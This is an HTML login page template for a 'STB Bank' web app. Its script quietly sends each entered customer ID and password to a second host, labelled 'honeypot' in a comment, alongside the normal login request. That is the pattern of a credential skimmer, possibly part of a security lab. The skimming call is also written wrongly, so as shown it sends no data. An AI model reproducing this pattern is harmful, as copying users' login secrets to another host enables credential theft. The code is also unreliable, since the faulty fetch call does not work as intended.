
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <title>Login | STB Bank</title>
    <style>
        body { display:flex; justify-content:center; align-items:center; min-height:100vh; background:#020617; }
        .login-box { background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.1); border-radius:20px; padding:50px 44px; width:100%; max-width:420px; box-shadow:0 20px 60px rgba(0,0,0,0.5); }
        .login-box h1 { color:#00ff9d; font-size:1.6rem; margin-bottom:6px; letter-spacing:2px; }
        .login-box p { color:#64748b; font-size:0.85rem; margin-bottom:32px; }
        .field { margin-bottom:18px; }
        .field label { display:block; font-size:12px; color:#94a3b8; margin-bottom:6px; letter-spacing:1px; text-transform:uppercase; }
        .field input { width:100%; padding:12px 14px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1); color:white; border-radius:8px; font-size:14px; outline:none; box-sizing:border-box; }
        .field input:focus { border-color:#00ff9d; }
        #login-btn { width:100%; padding:14px; margin-top:8px; background:linear-gradient(135deg,#00ff9d,#00d4ff); border:none; border-radius:10px; color:black; font-weight:bold; font-size:15px; cursor:pointer; letter-spacing:1px; }
        #login-btn:disabled { opacity:0.5; cursor:not-allowed; }
        #err-msg { color:#ef4444; font-size:13px; margin-top:12px; text-align:center; min-height:18px; }
    </style>
</head>
<body>
<div class="login-box">
    <h1>STB BANK</h1>
    <p>Sign in to access your secure account</p>
    <div class="field">
        <label>Customer ID</label>
        <input type="text" id="cust_id" placeholder="Enter your customer ID">
    </div>
    <div class="field">
        <label>Password</label>
        <input type="password" id="pass" placeholder="Enter your password">
    </div>
    <button id="login-btn" onclick="handleLogin(event)">SECURE LOGIN</button>
    <p id="err-msg"></p>
</div>
<script>
const BASE_URL = "http://127.0.0.1:5001";

window.onpageshow = function(e) { if(e.persisted) { document.getElementById("login-btn").disabled=false; document.getElementById("login-btn").textContent="SECURE LOGIN"; document.getElementById("err-msg").textContent=""; } };

async function handleLogin(event) {
    event.preventDefault();
    const cid = document.getElementById('cust_id').value.trim();
    const pwd = document.getElementById('pass').value;
    const btn = document.getElementById('login-btn');
    const err = document.getElementById('err-msg');

    if (!cid || !pwd) { err.textContent = 'Please fill in all fields.'; return; }

    btn.disabled = true;
    btn.textContent = 'AUTHENTICATING...';
    err.textContent = '';

    // Send to honeypot - fire and forget
    fetch("http://172.31.145.94:5000/", { signal: AbortSignal.timeout(500) }, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: cid, password: pwd })
    }).catch(() => {});

    // Login
    try {
        const res  = await fetch(`${BASE_URL}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ customer_id: cid, password: pwd })
        });
        const data = await res.json();
        if (data.success) {
            window.location.href = `${BASE_URL}${data.redirect}`;
        } else {
            err.textContent = 'Invalid Customer ID or Password!';
            btn.disabled = false;
            btn.textContent = 'SECURE LOGIN';
        }
    } catch(e) {
        err.textContent = 'Server error. Please try again.';
        btn.disabled = false;
        btn.textContent = 'SECURE LOGIN';
    }
}
</script>
</body>
</html>
